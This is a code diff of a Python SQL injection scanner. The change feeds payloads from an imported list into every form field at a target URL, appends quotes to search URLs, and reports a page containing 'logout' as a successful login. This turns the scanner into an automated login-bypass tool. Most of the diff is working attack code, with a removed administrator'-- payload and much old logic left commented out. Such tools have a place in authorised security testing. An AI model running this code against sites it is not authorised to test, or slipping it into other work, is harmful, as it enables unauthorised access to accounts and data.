@@ -3,6 +3,7 @@ import requests,sys,time
 from bs4 import BeautifulSoup as bs
 from urllib.parse import urljoin
 from pprint import pprint
+import payloads
 
 s = requests.Session()
 s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"
@@ -79,24 +80,28 @@ def sqlinjection_detectform(url):
 				#Another
 				"invalid csrf token",
 				"administrator",
-				"admin"
+				"admin",
+				"logout"
 			}
 			# print(response.content.decode().lower())
 			for error in errors:
 				# if you find one of these errors, return True
 				if error in response.content.decode().lower():
+					# print(error)
 					return True
 			# no error detected
 			return False
 
 		
-		def vulnerable(response):
-			slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
-			slowprint("\033[92m [+] Form:")
-			pprint(form_details)
+		# def vulnerable(response):
+		# 	slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
+		# 	slowprint("\033[92m [+] Form:")
+		# 	pprint(form_details)
 
 
 		def scan_sql_injection(url):
+			array = set()
+			array_form = set()
 			# test on URL
 			for c in "\"'":
 				# add quote/double quote character to the URL
@@ -106,9 +111,10 @@ def sqlinjection_detectform(url):
 				res = s.get(new_url)
 				# print(res)
 				if is_vulnerable(res):
+					# print("chay khong")
 					# SQL Injection detected on the URL itself, 
 					# no need to preceed for extracting forms and submitting them
-					print("\033[92m [+] SQL Injection vulnerability detected, link:", new_url)
+					print("\033[91m [+] SQL Injection vulnerability detected, link:", new_url)
 					return
 			# test on HTML forms
 			forms = get_all_forms(url)
@@ -130,25 +136,109 @@ def sqlinjection_detectform(url):
 								pass
 						elif input_tag["type"] != "submit":
 							# all others except submit, use some junk data with special character
-							data[input_tag["name"]] = f"administrator'--"
-							form_details[input_tag["name"]] = f"administrator'--"
+							# data[input_tag["name"]] = f"administrator'--"
+							# form_details[input_tag["name"]] = f"administrator'--"
 							# print(data[input_tag["name"]])
-					# join the url with the action (form request URL)
-					url = urljoin(url, form_details["action"])
-					if form_details["method"] == "post":
-						# print('method: POST')
-						res = s.post(url, data=data)
-						# print(data)
-						# print(res.text)
-					elif form_details["method"] == "get":
-						res = s.get(url, params=data)
+							# print(payloads.anotherSqlinjection)
+
+							for payload in payloads.anotherSqlinjection:
+								# print(form)
+								data[input_tag["name"]] = payload
+								form_details[input_tag["name"]] = payload
+								# join the url with the action (form request URL)
+								url = urljoin(url, form_details["action"])
+								getFormAction = form_details["action"]
+								if "search" in getFormAction:
+									isNotVul = True
+									for c in "\"'":
+										# add quote/double quote character to the URL
+										new_url = f"{url}{c}"
+										print("\033[93m [!] Trying", new_url)
+										# make the HTTP request
+										res = s.get(new_url)
+										# print(res)
+										if is_vulnerable(res):
+											# print("chay khong")
+											# SQL Injection detected on the URL itself, 
+											# no need to preceed for extracting forms and submitting them
+											isNotVul = False
+											print("\033[91m [+] SQL Injection vulnerability detected, link:", new_url)
+											return 
+										if isNotVul:
+
+
+											# testing
+											if form_details["method"] == "post":
+												# print('method: POST')
+												# here using session to request. Because the session has already then brute force workings not work
+												# res = s.post(url, data=data) 
+												res = requests.post(url, data=data)
+												if "logout" in res.content.decode().lower():
+													print(f"\033[92m [+] Logout:  ",data)
+												# array.add(res)
+												# pprint(form_details)
+												# print(data)
+												# print(payload)
+												# print(res.text)
+											elif form_details["method"] == "get":
+												res = s.get(url, params=data)
+												# array.add(res)
+												# pprint(form_details)
+
+											if is_vulnerable(res):
+												slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
+												# slowprint("\033[94m [+] Form:")
+												# pprint(form_details)
+												# print(res.status_code)
+												# break 
+											# testing
+
+									
+								else:		
+									if form_details["method"] == "post":
+										# print('method: POST')
+										# here using session to request. Because the session has already then brute force workings not work
+										# res = s.post(url, data=data) 
+										res = requests.post(url, data=data)
+										if "logout" in res.content.decode().lower():
+											print(f"\033[92m [+] Logout:  ",data)
+										# array.add(res)
+										# pprint(form_details)
+										# print(data)
+										# print(payload)
+										# print(res.text)
+									elif form_details["method"] == "get":
+										res = s.get(url, params=data)
+										# array.add(res)
+										# pprint(form_details)
+
+									if is_vulnerable(res):
+										slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
+										# slowprint("\033[94m [+] Form:")
+										# pprint(form_details)
+										# print(res.status_code)
+										# break 
+			# pprint(array)
+			# pprint(form_details)
+				
+					# # join the url with the action (form request URL)
+					# url = urljoin(url, form_details["action"])
+					# if form_details["method"] == "post":
+					# 	# print('method: POST')
+					# 	res = s.post(url, data=data)
+					# 	# print(data)
+					# 	# print(res.text)
+					# elif form_details["method"] == "get":
+					# 	res = s.get(url, params=data)
+
+
 
 					# test whether the resulting page is vulnerable
-					if is_vulnerable(res):
-						slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
-						slowprint("\033[94m [+] Form:")
-						pprint(form_details)
-						break 
+					# if is_vulnerable(res):
+					# 	slowprint(f"\033[91m [+] SQL Injection vulnerability detected, link: {url}")
+					# 	slowprint("\033[94m [+] Form:")
+					# 	pprint(form_details)
+					# 	break 
 
 			detect_form = len(forms)  
 			# print(detect_form)
